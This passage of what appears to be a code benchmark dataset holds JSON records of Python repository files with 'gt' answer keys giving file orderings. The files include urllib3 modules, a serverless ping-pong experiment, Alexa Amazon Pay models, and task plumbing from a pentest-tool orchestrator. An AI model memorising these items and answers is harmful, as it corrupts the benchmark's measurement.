redirect=redirect, default=self.retries)\n\n        if retries.connect or retries.read or retries.redirect:\n            warnings.warn(\n                \"URLFetch only supports total retries and does not \"\n                \"recognize connect, read, or redirect retry parameters.\",\n                AppEnginePlatformWarning,\n            )\n\n        return retries\n\n\n\n\nis_appengine = _appengine_environ.is_appengine\nis_appengine_sandbox = _appengine_environ.is_appengine_sandbox\nis_local_appengine = _appengine_environ.is_local_appengine\nis_prod_appengine = _appengine_environ.is_prod_appengine\nis_prod_appengine_mvms = _appengine_environ.is_prod_appengine_mvms\n\n'cloudfoxable/aws/challenges/Variable/data/lambda-src/urllib3/filepost.py'\n:from __future__ import absolute_import\n\nimport binascii\nimport codecs\nimport os\nfrom io import BytesIO\n\nfrom .fields import RequestField\nfrom .packages import six\nfrom .packages.six import b\n\nwriter = codecs.lookup(\"utf-8\")[3]\n\n\ndef choose_boundary():\n\n    boundary = binascii.hexlify(os.urandom(16))\n    if not six.PY2:\n        boundary = boundary.decode(\"ascii\")\n    return boundary\n\n\ndef iter_field_objects(fields):\n\n    if isinstance(fields, dict):\n        i = six.iteritems(fields)\n    else:\n        i = iter(fields)\n\n    for field in i:\n        if isinstance(field, RequestField):\n            yield field\n        else:\n            yield RequestField.from_tuples(*field)\n\n\ndef iter_fields(fields):\n\n    if isinstance(fields, dict):\n        return ((k, v) for k, v in six.iteritems(fields))\n\n    return ((k, v) for k, v in fields)\n\n\ndef encode_multipart_formdata(fields, boundary=None):\n\n    body = BytesIO()\n    if boundary is None:\n        boundary = choose_boundary()\n\n    for field in iter_field_objects(fields):\n        body.write(b(\"--%s\\r\\n\" % (boundary)))\n\n        writer(body).write(field.render_headers())\n        data = field.data\n\n        if isinstance(data, int):\n            data = str(data)\n\n        if isinstance(data, six.text_type):\n            writer(body).write(data)\n        else:\n            body.write(data)\n\n        body.write(b\"\\r\\n\")\n\n    body.write(b(\"--%s--\\r\\n\" % (boundary)))\n\n    content_type = str(\"multipart/form-data; boundary=%s\" % boundary)\n\n    return body.getvalue(), content_type\n\n'cloudfoxable/aws/challenges/Variable/data/lambda-src/urllib3/request.py'\n:from __future__ import absolute_import\n\nfrom .filepost import encode_multipart_formdata\nfrom .packages.six.moves.urllib.parse import urlencode\n\n__all__ = [\"RequestMethods\"]\n\n\nclass RequestMethods(object):\n\n\n    _encode_url_methods = {\"DELETE\", \"GET\", \"HEAD\", \"OPTIONS\"}\n\n    def __init__(self, headers=None):\n        self.headers = headers or {}\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        encode_multipart=True,\n        multipart_boundary=None,\n        **kw\n    ):\n        raise NotImplementedError(\n            \"Classes extending RequestMethods must implement \"\n            \"their own ``urlopen`` method.\"\n        )\n\n    def request(self, method, url, fields=None, headers=None, **urlopen_kw):\n\n        method = method.upper()\n\n        urlopen_kw[\"request_url\"] = url\n\n        if method in self._encode_url_methods:\n            return self.request_encode_url(\n                method, url, fields=fields, headers=headers, **urlopen_kw\n            )\n        else:\n            return self.request_encode_body(\n                method, url, fields=fields, headers=headers, **urlopen_kw\n            )\n\n    def request_encode_url(self, method, url, fields=None, headers=None, **urlopen_kw):\n\n        if headers is None:\n            headers = self.headers\n\n        extra_kw = {\"headers\": headers}\n        extra_kw.update(urlopen_kw)\n\n        if fields:\n            url += \"?\" + urlencode(fields)\n\n        return self.urlopen(method, url, **extra_kw)\n\n    def request_encode_body(\n        self,\n        method,\n        url,\n        fields=None,\n        headers=None,\n        encode_multipart=True,\n        multipart_boundary=None,\n        **urlopen_kw\n    ):\n\n        if headers is None:\n            headers = self.headers\n\n        extra_kw = {\"headers\": {}}\n\n        if fields:\n            if \"body\" in urlopen_kw:\n                raise TypeError(\n                    \"request got values for both 'fields' and 'body', can only specify one.\"\n                )\n\n            if encode_multipart:\n                body, content_type = encode_multipart_formdata(\n                    fields, boundary=multipart_boundary\n                )\n            else:\n                body, content_type = (\n                    urlencode(fields),\n                    \"application/x-www-form-urlencoded\",\n                )\n\n            extra_kw[\"body\"] = body\n            extra_kw[\"headers\"] = {\"Content-Type\": content_type}\n\n        extra_kw[\"headers\"].update(headers)\n        extra_kw.update(urlopen_kw)\n\n        return self.urlopen(method, url, **extra_kw)\n",
        "gt": [
            "'cloudfoxable/aws/challenges/Variable/data/lambda-src/urllib3/filepost.py'",
            "'cloudfoxable/aws/challenges/Variable/data/lambda-src/urllib3/request.py'",
            "'cloudfoxable/aws/challenges/Variable/data/lambda-src/urllib3/contrib/appengine.py'"
        ]
    },
    {
        "files": [
            "'serverless-benchmarks/sebs/experiments/network_ping_pong.py'",
            "'serverless-benchmarks/sebs/experiments/__init__.py'",
            "'serverless-benchmarks/sebs/types.py'",
            "'serverless-benchmarks/sebs/sebs.py'"
        ],
        "content": "'serverless-benchmarks/sebs/experiments/network_ping_pong.py'\n:import csv\nimport socket\nimport os\nimport time\nimport glob\nimport pandas as pd\nfrom datetime import datetime\nfrom itertools import repeat\nfrom typing import Dict, TYPE_CHECKING\nfrom multiprocessing.dummy import Pool as ThreadPool\n\nfrom sebs.faas.system import System as FaaSSystem\nfrom sebs.faas.function import Trigger\nfrom sebs.experiments.experiment import Experiment\nfrom sebs.experiments.config import Config as ExperimentConfig\n\n\nif TYPE_CHECKING:\n    from sebs import SeBS\n\n\nclass NetworkPingPong(Experiment):\n    def __init__(self, config: ExperimentConfig):\n        super().__init__(config)\n\n    def prepare(self, sebs_client: \"SeBS\", deployment_client: FaaSSystem):\n\n        benchmark = sebs_client.get_benchmark(\n            \"020.network-benchmark\", deployment_client, self.config\n        )\n        self._function = deployment_client.get_function(benchmark)\n        self._storage = deployment_client.get_storage(replace_existing=True)\n        self.benchmark_input = benchmark.prepare_input(storage=self._storage, size=\"test\")\n        self._out_dir = os.path.join(sebs_client.output_dir, \"network-ping-pong\")\n        if not os.path.exists(self._out_dir):\n\n            os.mkdir(self._out_dir)\n\n        triggers = self._function.triggers(Trigger.TriggerType.HTTP)\n        if len(triggers) == 0:\n            deployment_client.create_trigger(self._function, Trigger.TriggerType.HTTP)\n\n    def run(self):\n\n        from requests import get\n\n        ip = get(\"http://checkip.amazonaws.com/\").text.rstrip()\n        settings = self.config.experiment_settings(self.name())\n        invocations = settings[\"invocations\"]\n        repetitions = settings[\"repetitions\"]\n        threads = settings[\"threads\"]\n\n        pool = ThreadPool(threads)\n        ports = range(12000, 12000 + invocations)\n        pool.starmap(\n            self.receive_datagrams,\n            zip(repeat(repetitions, invocations), ports, repeat(ip, invocations)),\n        )\n\n\n        time.sleep(5)\n        self._storage.download_bucket(self.benchmark_input[\"output-bucket\"], self._out_dir)\n\n    def process(self, directory: str):\n\n        full_data: Dict[str, pd.Dataframe] = {}\n        for f in glob.glob(os.path.join(directory, \"network-ping-pong\", \"*.csv\")):\n\n            request_id = os.path.basename(f).split(\"-\", 1)[1].split(\".\")[0]\n            data = pd.read_csv(f, sep=\",\").drop([\"id\"], axis=1)\n            if request_id in full_data:\n                full_data[request_id] = pd.concat([full_data[request_id], data], axis=1)\n            else:\n                full_data[request_id] = data\n        df = pd.concat(full_data.values()).reset_index(drop=True)\n        df[\"rtt\"] = (df[\"server_rcv\"] - df[\"client_send\"]) + (df[\"client_rcv\"] - df[\"server_send\"])\n        print(\"Rows: \", df.shape[0])\n        print(\"Mean: \", df[\"rtt\"].mean())\n        print(\"STD: \", df[\"rtt\"].std())\n        print(\"CV: \", df[\"rtt\"].std() / df[\"rtt\"].mean())\n        print(\"P50: \", df[\"rtt\"].quantile(0.5))\n        print(\"P75: \", df[\"rtt\"].quantile(0.75))\n        print(\"P95: \", df[\"rtt\"].quantile(0.95))\n        print(\"P99: \", df[\"rtt\"].quantile(0.99))\n        print(\"P99,9: \", df[\"rtt\"].quantile(0.999))\n        ax = df[\"rtt\"].hist(bins=2000)\n\n        fig = ax.get_figure()\n        fig.savefig(os.path.join(directory, \"histogram.png\"))\n\n    def receive_datagrams(self, repetitions: int, port: int, ip: str):\n\n        print(f\"Starting invocation with {repetitions} repetitions on port {port}\")\n        socket.setdefaulttimeout(2)\n        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        server_socket.bind((\"\", port))\n\n        input_benchmark = {\n            \"server-address\": ip,\n            \"server-port\": port,\n            \"repetitions\": repetitions,\n            **self.benchmark_input,\n        }\n        self._function.triggers(Trigger.TriggerType.HTTP)[0].async_invoke(input_benchmark)\n\n        begin = datetime.now()\n        times = []\n        i = 0\n        j = 0\n        update_counter = int(repetitions / 10)\n        while i < repetitions + 1:\n            try:\n                message, address = server_socket.recvfrom(1024)\n                timestamp_rcv = datetime.now().timestamp()\n                timestamp_send = datetime.now().timestamp()\n                server_socket.sendto(message, address)\n            except socket.timeout:\n                i += 1\n                print(\"Packet loss!\")\n                continue\n            if i > 0:\n                times.append([i, timestamp_rcv, timestamp_send])\n            if j == update_counter:\n                print(f\"Invocation on port {port} processed {i} requests.\")\n                j = 0\n            i += 1\n            j += 1\n        request_id = message.decode()\n        end = datetime.now()\n        print(f\"Finished {request_id} in {end - begin} [s]\")\n\n        output_file = os.path.join(self._out_dir, f\"server-{request_id}.csv\")\n        with open(output_file, \"w\") as csvfile:\n            writer = csv.writer(csvfile, delimiter=\",\")\n            writer.writerow([\"id\", \"server_rcv\", \"server_send\"])\n            for row in times:\n                writer.writerow(row)\n\n    @staticmethod\n    def name() -> str:\n        return \"network-ping-pong\"\n\n    @staticmethod\n    def typename() -> str:\n        return \"Experiment.NetworkPingPong\"\n\n'serverless-benchmarks/sebs/experiments/__init__.py'\n:from .result import Result as ExperimentResult\nfrom .experiment import Experiment\nfrom .perf_cost import PerfCost\nfrom .network_ping_pong import NetworkPingPong\nfrom .eviction_model import EvictionModel\nfrom .invocation_overhead import InvocationOverhead\n\n'serverless-benchmarks/sebs/types.py'\n:from enum import Enum\n\n\nclass Platforms(str, Enum):\n    AWS = \"aws\"\n    AZURE = \"azure\"\n    GCP = \"gcp\"\n    LOCAL = \"local\"\n    OPENWHISK = \"openwhisk\"\n\n\nclass Storage(str, Enum):\n    AWS_S3 = \"aws-s3\"\n    AZURE_BLOB_STORAGE = \"azure-blob-storage\"\n    GCP_STORAGE = \"google-cloud-storage\"\n    MINIO = \"minio\"\n\n'serverless-benchmarks/sebs/sebs.py'\n:import os\nfrom typing import Optional, Dict, Type\n\nimport docker\n\nimport sebs.storage\nfrom sebs import types\nfrom sebs.local import Local\nfrom sebs.cache import Cache\nfrom sebs.config import SeBSConfig\nfrom sebs.benchmark import Benchmark\nfrom sebs.faas.system import System as FaaSSystem\nfrom sebs.faas.storage import PersistentStorage\nfrom sebs.faas.config import Config\nfrom sebs.utils import has_platform, LoggingHandlers, LoggingBase\n\nfrom sebs.experiments.config import Config as ExperimentConfig\nfrom sebs.experiments import Experiment\n\n\nclass SeBS(LoggingBase):\n    @property\n    def cache_client(self) -> Cache:\n        return self._cache_client\n\n    @property\n    def docker_client(self) -> docker.client:\n        return self._docker_client\n\n    @property\n    def output_dir(self) -> str:\n        return self._output_dir\n\n    @property\n    def verbose(self) -> bool:\n        return self._verbose\n\n    @property\n    def logging_filename(self) -> Optional[str]:\n        return self._logging_filename\n\n    @property\n    def config(self) -> SeBSConfig:\n        return self._config\n\n    def generate_logging_handlers(self, logging_filename: Optional[str] = None) -> LoggingHandlers:\n        filename = logging_filename if logging_filename else self.logging_filename\n        if filename in self._handlers:\n            return self._handlers[filename]\n        else:\n            handlers = LoggingHandlers(verbose=self.verbose, filename=filename)\n            self._handlers[filename] = handlers\n            return handlers\n\n    def __init__(\n        self,\n        cache_dir: str,\n        output_dir: str,\n        verbose: bool = False,\n        logging_filename: Optional[str] = None,\n    ):\n        super().__init__()\n        self._cache_client = Cache(cache_dir)\n        self._docker_client = docker.from_env()\n        self._config = SeBSConfig()\n        self._output_dir = output_dir\n        self._verbose = verbose\n        self._logging_filename = logging_filename\n        self._handlers: Dict[Optional[str], LoggingHandlers] = {}\n        self.logging_handlers = self.generate_logging_handlers()\n\n        os.makedirs(self.output_dir, exist_ok=True)\n\n    def ignore_cache(self):\n\n        self._cache_client.ignore_storage = True\n        self._cache_client.ignore_functions = True\n\n    def get_deployment(\n        self,\n        config: dict,\n        logging_filename: Optional[str] = None,\n        deployment_config: Optional[Config] = None,\n    ) -> FaaSSystem:\n        name = config[\"name\"]\n        implementations: Dict[str, Type[FaaSSystem]] = {\"local\": Local}\n\n        if has_platform(\"aws\"):\n            from sebs.aws import AWS\n\n            implementations[\"aws\"] = AWS\n        if has_platform(\"azure\"):\n            from sebs.azure.azure import Azure\n\n            implementations[\"azure\"] = Azure\n        if has_platform(\"gcp\"):\n            from sebs.gcp import GCP\n\n            implementations[\"gcp\"] = GCP\n        if has_platform(\"openwhisk\"):\n            from sebs.openwhisk import OpenWhisk\n\n            implementations[\"openwhisk\"] = OpenWhisk\n\n        if name not in implementations:\n            raise RuntimeError(\"Deployment {name} not supported!\".format(name=name))\n\n\n        handlers = self.generate_logging_handlers(logging_filename)\n        if not deployment_config:\n            deployment_config = Config.deserialize(config, self.cache_client, handlers)\n        deployment_client = implementations[name](\n            self._config,\n            deployment_config,\n            self.cache_client,\n            self.docker_client,\n            handlers,\n        )\n        return deployment_client\n\n    def get_deployment_config(\n        self,\n        config: dict,\n        logging_filename: Optional[str] = None,\n    ) -> Config:\n        handlers = self.generate_logging_handlers(logging_filename)\n        return Config.deserialize(config, self.cache_client, handlers)\n\n    def get_experiment_config(self, config: dict) -> ExperimentConfig:\n        return ExperimentConfig.deserialize(config)\n\n    def get_experiment(\n        self, experiment_type: str, config: dict, logging_filename: Optional[str] = None\n    ) -> Experiment:\n        from sebs.experiments import (\n            Experiment,\n            PerfCost,\n            NetworkPingPong,\n            InvocationOverhead,\n            EvictionModel,\n        )\n\n        implementations: Dict[str, Type[Experiment]] = {\n            \"perf-cost\": PerfCost,\n            \"network-ping-pong\": NetworkPingPong,\n            \"invocation-overhead\": InvocationOverhead,\n            \"eviction-model\": EvictionModel,\n        }\n        if experiment_type not in implementations:\n            raise RuntimeError(f\"Experiment {experiment_type} not supported!\")\n        experiment = implementations[experiment_type](self.get_experiment_config(config))\n        experiment.logging_handlers = self.generate_logging_handlers(\n            logging_filename=logging_filename\n        )\n        return experiment\n\n    def get_benchmark(\n        self,\n        name: str,\n        deployment: FaaSSystem,\n        config: ExperimentConfig,\n        logging_filename: Optional[str] = None,\n    ) -> Benchmark:\n        benchmark = Benchmark(\n            name,\n            deployment.name(),\n            config,\n            self._config,\n            self._output_dir,\n            self.cache_client,\n            self.docker_client,\n        )\n        benchmark.logging_handlers = self.generate_logging_handlers(\n            logging_filename=logging_filename\n        )\n        return benchmark\n\n    @staticmethod\n    def get_storage_implementation(storage_type: types.Storage) -> Type[PersistentStorage]:\n        _storage_implementations = {types.Storage.MINIO: sebs.storage.minio.Minio}\n        impl = _storage_implementations.get(storage_type)\n        assert impl\n        return impl\n\n    @staticmethod\n    def get_storage_config_implementation(storage_type: types.Storage):\n        _storage_implementations = {types.Storage.MINIO: sebs.storage.config.MinioConfig}\n        impl = _storage_implementations.get(storage_type)\n        assert impl\n        return impl\n\n    def shutdown(self):\n        self.cache_client.shutdown()\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self):\n        self.shutdown()\n",
        "gt": [
            "'serverless-benchmarks/sebs/types.py'",
            "'serverless-benchmarks/sebs/sebs.py'",
            "'serverless-benchmarks/sebs/experiments/network_ping_pong.py'",
            "'serverless-benchmarks/sebs/experiments/__init__.py'"
        ]
    },
    {
        "files": [
            "'project-black/black/workers/common/async_task.py'",
            "'project-black/black/workers/patator/patator_worker.py'",
            "'project-black/black/workers/common/task.py'",
            "'project-black/spawn_worker.py'",
            "'project-black/black/workers/patator/patator_task.py'"
        ],
        "content": "'project-black/black/workers/common/async_task.py'\n:\nimport json\nimport aio_pika\nfrom asyncio import Lock, get_event_loop\nfrom black.db import sessions\nfrom black.workers.common.task import Task\n\nfrom config import CONFIG\n\n\nclass AsyncTask(Task):\n\n\n    def __init__(self, task_id, task_type, target, params, project_uuid):\n        Task.__init__(self, task_id, task_type, target, params, project_uuid)\n        self.exchange_lock = None\n        self.connection = None\n        self.channel = None\n        self.exchange = None\n\n    async def __aenter__(self):\n\n        self.connection = await aio_pika.connect_robust(\n            \"amqp://{}:{}@{}:{}/\".format(\n                CONFIG['rabbit']['username'],\n                CONFIG['rabbit']['password'],\n                CONFIG['rabbit']['host'],\n                CONFIG['rabbit']['port']\n            ), loop=get_event_loop()\n        )\n\n\n        self.channel = await self.connection.channel()\n\n\n        self.exchange = await self.channel.declare_exchange(\n            'tasks.exchange',\n            durable=True\n        )\n\n\n        queue = await self.channel.declare_queue(\n            'tasks_statuses',\n            durable=True\n        )\n        await queue.bind(\n            self.exchange,\n            routing_key='tasks_statuses'\n        )\n\n        return self\n\n    async def __aexit__(self, exc_type, exc, tb):\n        await self.channel.close()\n        await self.connection.close()\n\n    async def initialize(self):\n        self.exchange_lock = Lock()\n\n        await self.set_status(\"New\")\n\n    async def set_status(self, new_status, progress=0, text=\"\"):\n        Task.set_status(self, new_status, progress=progress, text=text)\n\n        msg = aio_pika.Message(\n            body=json.dumps({\n                'task_id': self.task_id,\n                'status': new_status,\n                'progress': progress,\n                'text': text,\n                'new_stdout': \"\",\n                'new_stderr': \"\"\n            }).encode()\n        )\n\n        await self.exchange_lock.acquire()\n        await self.exchange.publish(msg, 'tasks_statuses')\n        self.exchange_lock.release()\n\n    async def append_stdout(self, new_stdout):\n        Task.append_stdout(self, new_stdout)\n\n        msg = aio_pika.Message(\n            body=json.dumps({\n                'task_id': self.task_id,\n                'status': self.status,\n                'progress': self.progress,\n                'text': self.text,\n                'new_stdout': new_stdout,\n                'new_stderr': \"\"\n            }).encode()\n        )\n\n        await self.exchange_lock.acquire()\n        await self.exchange.publish(msg, 'tasks_statuses')\n        self.exchange_lock.release()\n\n    async def append_stderr(self, new_stderr):\n        Task.append_stderr(self, new_stderr)\n\n        msg = aio_pika.Message(\n            body=json.dumps({\n                'task_id': self.task_id,\n                'status': self.status,\n                'progress': self.progress,\n                'text': self.text,\n                'new_stdout': \"\",\n                'new_stderr': new_stderr\n            }).encode()\n        )\n\n        await self.exchange_lock.acquire()\n        await self.exchange.publish(msg, 'tasks_statuses')\n        self.exchange_lock.release()\n\n'project-black/black/workers/patator/patator_worker.py'\n:\nimport os\n\nfrom black.db import Sessions, DictDatabase\n\nfrom black.workers.patator.patator_task import PatatorTask\nfrom black.workers.common.async_worker import AsyncWorker\n\n\nclass PatatorWorker(AsyncWorker):\n\n    def __init__(self):\n        AsyncWorker.__init__(self, 'patator', PatatorTask)\n\n    def fetch_ditionaries(self):\n        session_spawner = Sessions()\n        with session_spawner.get_session() as session:\n            dicts_raw = (\n                session.query(\n                    DictDatabase\n                ).filter(\n                    DictDatabase.dict_type == self.name\n                ).all()\n            )\n\n        dicts = list(map(lambda dictionary: dictionary.dict(), dicts_raw))\n        wordlists_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'wordlists')\n        existing_dicts = os.listdir(wordlists_path)\n\n        for dictionary in dicts:\n            name = dictionary[\"name\"]\n            if dictionary[\"name\"] not in existing_dicts:\n                with open(os.path.join(wordlists_path, name), \"w\") as w:\n                    w.write(dictionary[\"content\"])\n\n    async def start(self):\n\n        self.fetch_ditionaries()\n        await self.initialize(max_tasks=2)\n        await self.start_tasks_consumer()\n        await self.start_notifications_consumer()\n\n'project-black/black/workers/common/task.py'\n:\nimport json\nfrom datetime import datetime\n\nfrom black.db import Sessions, TaskDatabase\n\n\nclass Task(object):\n\n\n    def __init__(self, task_id, task_type, target, params, project_uuid):\n\n        self.task_id = task_id\n\n\n        self.task_type = task_type\n\n\n        self.target = target\n\n\n        self.params = params\n\n\n        self.project_uuid = project_uuid\n\n\n        self.status = None\n\n\n        self.progress = None\n\n\n        self.text = None\n\n\n\n\n        self.proc = None\n\n\n        self.stdout = None\n        self.stderr = None\n        self.exit_code = None\n\n        self.exchange = None\n\n        self.sessions = Sessions()\n\n\n        self.create_db_record()\n\n    def get_id(self):\n\n        return self.task_id\n\n    def set_status(self, new_status, progress=0, text=\"\"):\n\n        self.status = new_status\n        self.progress = progress\n\n        session = self.sessions.get_new_session()\n        task_db_object = session.query(TaskDatabase).filter_by(\n            task_id=self.get_id()\n        ).first()\n        task_db_object.status = new_status\n        task_db_object.progress = progress\n        task_db_object.text = text\n\n        if new_status == 'Finished' or new_status == 'Aborted':\n            task_db_object.date_finished = datetime.utcnow()\n\n        session.commit()\n        self.sessions.destroy_session(session)\n\n    def append_stdout(self, stdout=\"\"):\n        self.stdout.append(stdout)\n\n\n\n\n\n\n\n\n\n    def append_stderr(self, stderr=\"\"):\n        self.stderr.append(stderr)\n\n\n\n\n\n\n\n\n\n    def get_status(self):\n\n        return self.status\n\n    async def start(self):\n\n        raise NotImplementedError\n\n    def send_notification(self, command):\n\n        raise NotImplementedError\n\n    def wait_for_exit(self):\n        raise NotImplementedError\n\n    def create_db_record(self):\n\n        session = self.sessions.get_new_session()\n        task_new_object = TaskDatabase(\n            task_id=self.get_id(),\n            task_type=self.task_type,\n            target=json.dumps(self.target),\n            params=json.dumps(self.params),\n            project_uuid=self.project_uuid,\n            stdout=\"\",\n            stderr=\"\"\n        )\n        session.add(task_new_object)\n        session.commit()\n        self.sessions.destroy_session(session)\n\n'project-black/spawn_worker.py'\n:import sys\nimport asyncio\nimport argparse\n\nfrom black.workers.amass.amass_worker import AmassWorker\nfrom black.workers.nmap.nmap_worker import NmapWorker\nfrom black.workers.masscan.masscan_worker import MasscanWorker\nfrom black.workers.patator.patator_worker import PatatorWorker\nfrom black.workers.dirsearch.dirsearch_worker import DirsearchWorker\n\n\ndef run(task):\n    try:\n        loop = asyncio.get_event_loop()\n        task_instance = task()\n        loop.create_task(task_instance.start())\n        loop.run_forever()\n    except KeyboardInterrupt:\n        loop.run_until_complete(task_instance.stop())\n        sys.exit(1)\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Launch one of workers')\n    parser.add_argument(\n        'worker', nargs=1,\n        choices=['amass', 'masscan', 'nmap', 'patator', 'dirsearch'],\n        help='worker type')\n    parser.add_argument(\n        '--config', nargs='+',\n        help='config file')\n\n    args = parser.parse_args()\n    worker_type = args.worker[0]\n\n    if worker_type == 'amass':\n        run(AmassWorker)\n    elif worker_type == 'nmap':\n        run(NmapWorker)\n    elif worker_type == 'masscan':\n        run(MasscanWorker)\n    elif worker_type == 'dirsearch':\n        run(DirsearchWorker)\n    elif worker_type == 'patator':\n        run(PatatorWorker)\n\n'project-black/black/workers/patator/patator_task.py'\n:\nimport os\nimport sys\nimport json\nimport shlex\nimport asyncio\nimport asyncio.streams\nfrom concurrent.futures import ProcessPoolExecutor\nfrom black.workers.patator.patator_ext import modules\n\nfrom black.workers.common.async_task import AsyncTask\n\n\ndef start_program(arguments, host, port, task_id, project_uuid, socket_path):\n\n    args = shlex.split(arguments)\n    name = args[0]\n    available = dict(modules)\n    ctrl, module = available[name]\n    powder = ctrl(module, [name] + args[1:], host, port, task_id, project_uuid, socket_path)\n    powder.fire()\n\n\nclass PatatorTask(AsyncTask):\n\n\n    def __init__(self, task_id, target, params, project_uuid):\n        AsyncTask.__init__(\n            self, task_id, 'patator', target, params, project_uuid\n        )\n\n        self.patator_proc = None\n        self.socket_path = None\n\n        self.loop = asyncio.get_event_loop()\n\n        self.all_done = asyncio.Lock()\n\n    async def start(self):\n        await self.all_done.acquire()\n        host, port = self.target.split(':')\n        args = self.params['program'][0] + \" host={} port={}\".format(host, port)\n\n        await self.set_status('Working', progress=0)\n\n        socket_name = '{}.sock'.format(self.task_id)\n        self.socket_path = os.path.join(os.getcwd(), socket_name)\n\n        if os.path.exists(self.socket_path):\n            os.remove(self.socket_path)\n\n        await asyncio.streams.start_unix_server(self.client_connected_cb, path=self.socket_path, loop=self.loop)\n\n        try:\n            self.patator_proc = self.loop.run_in_executor(\n                ProcessPoolExecutor(), start_program, args,\n                host, port, self.task_id, self.project_uuid,\n                self.socket_path\n            )\n        except Exception as exc:\n            print(\"Exception starting ProcessPoolExecutor\", exc)\n\n    def client_connected_cb(self, reader, writer):\n\n        self.loop.create_task(self.poll_status(reader))\n\n    async def poll_status(self, reader):\n\n        try:\n            data = await reader.read(1000)\n\n            if data:\n\n                decoded_data = json.loads(data.decode('utf-8').split(\"SPLITHERE\")[-2])\n                status = decoded_data['status']\n                progress = decoded_data['progress']\n\n                if status == 'Finished' or status == 'Aborted':\n                    await self.set_status(status, progress=progress, text=self.target)\n\n                    self.all_done.release()\n                    return\n                else:\n                    await self.set_status(status, progress=progress)\n\n            self.loop.create_task(self.poll_status(reader))\n        except Exception as exc:\n            print(\"Patator:poll_status\", exc, data)\n            self.loop.create_task(self.poll_status(reader))\n\n    async def wait_for_exit(self):\n\n        await self.patator_proc\n\n        await self.all_done.acquire()\n        if os.path.exists(self.socket_path):\n            os.remove(self.socket_path)\n\n    async def cancel(self):\n        self.patator_proc.cancel()\n\n        if os.path.exists(self.socket_path):\n            os.remove(self.socket_path)\n\n        await self.set_status(\"Aborted\", progress=0)\n",
        "gt": [
            "'project-black/black/workers/common/task.py'",
            "'project-black/black/workers/common/async_task.py'",
            "'project-black/black/workers/patator/patator_task.py'",
            "'project-black/black/workers/patator/patator_worker.py'",
            "'project-black/spawn_worker.py'"
        ]
    },
    {
        "files": [
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/amazonpay/request/__init__.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/amazonpay/model/request/billing_agreement_attributes.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/amazonpay/model/request/billing_agreement_type.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/amazonpay/request/setup_amazon_pay_request.py'"
        ],
        "content": "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/amazonpay/request/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\n\nfrom .charge_amazon_pay_request import ChargeAmazonPayRequest\nfrom .setup_amazon_pay_request import SetupAmazonPayRequest\n\n'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/amazonpay/model/request/billing_agreement_attributes.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport pprint\nimport re\nimport six\nimport typing\nfrom enum import Enum\nfrom ask_sdk_model.interfaces.amazonpay.model.request.base_amazon_pay_entity import BaseAmazonPayEntity\n\n\nif typing.TYPE_CHECKING:\n    from typing import Dict, List, Optional, Union, Any\n    from datetime import datetime\n    from ask_sdk_model.interfaces.amazonpay.model.request.billing_agreement_type import BillingAgreementType as BillingAgreementType_33b14792\n    from ask_sdk_model.interfaces.amazonpay.model.request.seller_billing_agreement_attributes import SellerBillingAgreementAttributes as SellerBillingAgreementAttributes_4f93d175\n    from ask_sdk_model.interfaces.amazonpay.model.request.price import Price as Price_28baad92\n\n\nclass BillingAgreementAttributes(BaseAmazonPayEntity):\n\n    deserialized_types = {\n        'platform_id': 'str',\n        'seller_note': 'str',\n        'seller_billing_agreement_attributes': 'ask_sdk_model.interfaces.amazonpay.model.request.seller_billing_agreement_attributes.SellerBillingAgreementAttributes',\n        'billing_agreement_type': 'ask_sdk_model.interfaces.amazonpay.model.request.billing_agreement_type.BillingAgreementType',\n        'subscription_amount': 'ask_sdk_model.interfaces.amazonpay.model.request.price.Price',\n        'object_type': 'str',\n        'version': 'str'\n    }\n\n    attribute_map = {\n        'platform_id': 'platformId',\n        'seller_note': 'sellerNote',\n        'seller_billing_agreement_attributes': 'sellerBillingAgreementAttributes',\n        'billing_agreement_type': 'billingAgreementType',\n        'subscription_amount': 'subscriptionAmount',\n        'object_type': '@type',\n        'version': '@version'\n    }\n    supports_multiple_types = False\n\n    def __init__(self, platform_id=None, seller_note=None, seller_billing_agreement_attributes=None, billing_agreement_type=None, subscription_amount=None, version=None):\n\n\n        self.__discriminator_value = \"BillingAgreementAttributes\"\n\n        self.object_type = self.__discriminator_value\n        super(BillingAgreementAttributes, self).__init__(object_type=self.__discriminator_value, version=version)\n        self.platform_id = platform_id\n        self.seller_note = seller_note\n        self.seller_billing_agreement_attributes = seller_billing_agreement_attributes\n        self.billing_agreement_type = billing_agreement_type\n        self.subscription_amount = subscription_amount\n\n    def to_dict(self):\n\n\n        result = {}\n\n        for attr, _ in six.iteritems(self.deserialized_types):\n            value = getattr(self, attr)\n            if isinstance(value, list):\n                result[attr] = list(map(\n                    lambda x: x.to_dict() if hasattr(x, \"to_dict\") else\n                    x.value if isinstance(x, Enum) else x,\n                    value\n                ))\n            elif isinstance(value, Enum):\n                result[attr] = value.value\n            elif hasattr(value, \"to_dict\"):\n                result[attr] = value.to_dict()\n            elif isinstance(value, dict):\n                result[attr] = dict(map(\n                    lambda item: (item[0], item[1].to_dict())\n                    if hasattr(item[1], \"to_dict\") else\n                    (item[0], item[1].value)\n                    if isinstance(item[1], Enum) else item,\n                    value.items()\n                ))\n            else:\n                result[attr] = value\n\n        return result\n\n    def to_str(self):\n\n\n        return pprint.pformat(self.to_dict())\n\n    def __repr__(self):\n\n\n        return self.to_str()\n\n    def __eq__(self, other):\n\n\n        if not isinstance(other, BillingAgreementAttributes):\n            return False\n\n        return self.__dict__ == other.__dict__\n\n    def __ne__(self, other):\n\n\n        return not self == other\n\n'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/amazonpay/model/request/billing_agreement_type.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport pprint\nimport re\nimport six\nimport typing\nfrom enum import Enum\n\n\nif typing.TYPE_CHECKING:\n    from typing import Dict, List, Optional, Union, 